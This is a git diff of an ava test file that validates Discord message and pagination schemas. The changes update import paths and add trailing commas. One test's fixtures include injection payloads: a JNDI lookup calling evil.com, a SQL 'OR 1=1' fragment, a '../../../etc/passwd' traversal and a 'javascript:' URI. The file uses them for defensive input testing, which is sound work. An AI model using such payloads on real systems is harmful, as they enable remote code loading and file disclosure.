@@ -3,18 +3,18 @@ import test from 'ava';
 // Test Discord input validation and sanitization by examining the schema definitions
 test('discord_send_message - schema validates content length', async (t) => {
   // Import the schema from the actual discord module
-  const { MessagePayload } = await import('../../dist/tools/discord.js');
+  const { MessagePayload } = await import('../tools/discord.js');
 
   // Test valid content within limits
   const validMessage = {
-    content: 'Hello, world!'
+    content: 'Hello, world!',
   };
 
   t.notThrows(() => MessagePayload.parse(validMessage));
 
   // Test empty content (should fail validation)
   const emptyMessage = {
-    content: ''
+    content: '',
   };
 
   t.throws(() => MessagePayload.parse(emptyMessage));
@@ -22,7 +22,7 @@ test('discord_send_message - schema validates content length', async (t) => {
   // Test content at maximum length (2000 chars)
   const maxLengthContent = 'a'.repeat(2000);
   const maxLengthMessage = {
-    content: maxLengthContent
+    content: maxLengthContent,
   };
 
   t.notThrows(() => MessagePayload.parse(maxLengthMessage));
@@ -30,14 +30,14 @@ test('discord_send_message - schema validates content length', async (t) => {
   // Test content exceeding maximum length
   const overLengthContent = 'a'.repeat(2001);
   const overLengthMessage = {
-    content: overLengthContent
+    content: overLengthContent,
   };
 
   t.throws(() => MessagePayload.parse(overLengthMessage));
 });
 
 test('discord_send_message - schema requires content or embeds', async (t) => {
-  const { MessagePayload } = await import('../../dist/tools/discord.js');
+  const { MessagePayload } = await import('../tools/discord.js');
 
   // Test completely empty message (should fail)
   const emptyMessage = {};
@@ -46,32 +46,32 @@ test('discord_send_message - schema requires content or embeds', async (t) => {
   // Test message with empty content and no embeds (should fail)
   const emptyContentMessage = {
     content: '',
-    embeds: []
+    embeds: [],
   };
   t.throws(() => MessagePayload.parse(emptyContentMessage));
 
   // Test message with valid content (should pass)
   const contentMessage = {
-    content: 'Hello, world!'
+    content: 'Hello, world!',
   };
   t.notThrows(() => MessagePayload.parse(contentMessage));
 
   // Test message with valid embeds (should pass)
   const embedsMessage = {
-    embeds: [{ title: 'Test Embed' }]
+    embeds: [{ title: 'Test Embed' }],
   };
   t.notThrows(() => MessagePayload.parse(embedsMessage));
 
   // Test message with both content and embeds (should pass)
   const bothMessage = {
     content: 'Hello, world!',
-    embeds: [{ title: 'Test Embed' }]
+    embeds: [{ title: 'Test Embed' }],
   };
   t.notThrows(() => MessagePayload.parse(bothMessage));
 });
 
 test('discord_send_message - schema validates embed structure', async (t) => {
-  const { MessagePayload } = await import('../../dist/tools/discord.js');
+  const { MessagePayload } = await import('../tools/discord.js');
 
   // Test with invalid embed structure (should still pass schema validation)
   // as embeds are typed as 'unknown[]' - validation happens at API level
@@ -81,8 +81,8 @@ test('discord_send_message - schema validates embed structure', async (t) => {
       { title: 123 }, // Invalid title type
       { description: {} }, // Invalid description type
       null, // Invalid embed object
-      undefined // Invalid embed object
-    ]
+      undefined, // Invalid embed object
+    ],
   };
 
   // Schema should allow this as embed validation is not strict at this level
@@ -90,7 +90,7 @@ test('discord_send_message - schema validates embed structure', async (t) => {
 });
 
 test('discord_list_messages - schema validates pagination parameters', async (t) => {
-  const { ListSchema } = await import('../../dist/tools/discord.js');
+  const { ListSchema } = await import('../tools/discord.js');
 
   // Test valid limit values
   const validLimit = { limit: 50 };
@@ -123,13 +123,13 @@ test('discord_list_messages - schema validates pagination parameters', async (t)
 });
 
 test('discord_list_messages - schema validates pagination ID formats', async (t) => {
-  const { ListSchema } = await import('../../dist/tools/discord.js');
+  const { ListSchema } = await import('../tools/discord.js');
 
   // Test valid snowflake-like IDs
   const validIds = [
     { before: '123456789012345678' },
     { after: '987654321098765432' },
-    { around: '111111111111111111' }
+    { around: '111111111111111111' },
   ];
 
   for (const validId of validIds) {
@@ -137,11 +137,7 @@ test('discord_list_messages - schema validates pagination ID formats', async (t)
   }
 
   // Test empty/missing IDs (should pass - they're optional)
-  const emptyIds = [
-    {},
-    { before: '' },
-    { after: undefined }
-  ];
+  const emptyIds = [{}, { before: '' }, { after: undefined }];
 
   for (const emptyId of emptyIds) {
     t.notThrows(() => ListSchema.parse(emptyId));
@@ -153,7 +149,7 @@ test('discord_list_messages - schema validates pagination ID formats', async (t)
     { after: 'unicode: 世界' },
     { around: 'mixed-CASE-123' },
     { before: 'with spaces' },
-    { after: 'with.dots' }
+    { after: 'with.dots' },
   ];
 
   for (const format of variousFormats) {
@@ -162,7 +158,7 @@ test('discord_list_messages - schema validates pagination ID formats', async (t)
 });
 
 test('discord tools - schema prevents injection through parameter validation', async (t) => {
-  const { MessagePayload, ListSchema } = await import('../../dist/tools/discord.js');
+  const { MessagePayload, ListSchema } = await import('../tools/discord.js');
 
   // Test various potentially malicious inputs that should be handled by schema validation
   const injectionAttempts = [
@@ -196,7 +192,7 @@ test('discord tools - schema prevents injection through parameter validation', a
     // Unicode attacks
     { content: '\u202E_RIGHT-TO-LEFT_OVERRIDE_' },
     { content: '\u200D_ZERO_WIDTH_JOINER_' },
-    { content: '\uFEFF_ZERO_WIDTH_NO-BREAK_SPACE_' }
+    { content: '\uFEFF_ZERO_WIDTH_NO-BREAK_SPACE_' },
   ];
 
   // All these should pass schema validation (content is valid string)
@@ -211,7 +207,7 @@ test('discord tools - schema prevents injection through parameter validation', a
     { after: 'javascript:void(0)' },
     { around: '${jndi:ldap://evil.com/a}' },
     { limit: 50, before: ' OR 1=1--' },
-    { limit: 100, after: '../../../etc/passwd' }
+    { limit: 100, after: '../../../etc/passwd' },
   ];
 
   for (const maliciousParam of maliciousListParams) {
@@ -220,7 +216,7 @@ test('discord tools - schema prevents injection through parameter validation', a
 });
 
 test('discord tools - schema handles edge cases', async (t) => {
-  const { MessagePayload } = await import('../../dist/tools/discord.js');
+  const { MessagePayload } = await import('../tools/discord.js');
 
   // Test very long strings (within content limit)
   const longContent = 'a'.repeat(2000);
@@ -236,7 +232,7 @@ test('discord tools - schema handles edge cases', async (t) => {
     allowed_mentions: null,
     tts: null,
     components: null,
-    attachments: null
+    attachments: null,
   };
   // Zod correctly rejects null values for optional fields - good security behavior
   t.throws(() => MessagePayload.parse(nullOptionalFields));
@@ -244,13 +240,7 @@ test('discord tools - schema handles edge cases', async (t) => {
   // Test arrays with mixed types for embeds
   const mixedEmbeds = {
     content: 'test',
-    embeds: [
-      { title: 'Valid' },
-      null,
-      undefined,
-      {},
-      { description: 'Also valid' }
-    ]
+    embeds: [{ title: 'Valid' }, null, undefined, {}, { description: 'Also valid' }],
   };
   t.notThrows(() => MessagePayload.parse(mixedEmbeds));
 
@@ -258,7 +248,7 @@ test('discord tools - schema handles edge cases', async (t) => {
   const booleanFlags = {
     content: 'test',
     tts: true,
-    allowed_mentions: { parse: [] }
+    allowed_mentions: { parse: [] },
   };
   t.notThrows(() => MessagePayload.parse(booleanFlags));
 });
@@ -268,7 +258,9 @@ test('discord tools - environment variable requirements', async (t) => {
   // This is a schema-level test, actual environment variable handling
   // is tested in the integration tests
 
-  const { createDiscordSendMessageTool, createDiscordListMessagesTool } = await import('../../dist/tools/discord.js');
+  const { createDiscordSendMessageTool, createDiscordListMessagesTool } = await import(
+    '../tools/discord.js'
+  );
 
   // Both tools should be ToolFactory functions
   t.is(typeof createDiscordSendMessageTool, 'function');
@@ -279,10 +271,10 @@ test('discord tools - environment variable requirements', async (t) => {
     env: {
       DISCORD_PROVIDER: 'test-provider',
       DISCORD_TENANT: 'test-tenant',
-      DISCORD_SPACE_URN: 'test-space-urn'
+      DISCORD_SPACE_URN: 'test-space-urn',
     },
     fetch: global.fetch,
-    now: () => new Date()
+    now: () => new Date(),
   };
 
   // Tools should create successfully with proper context
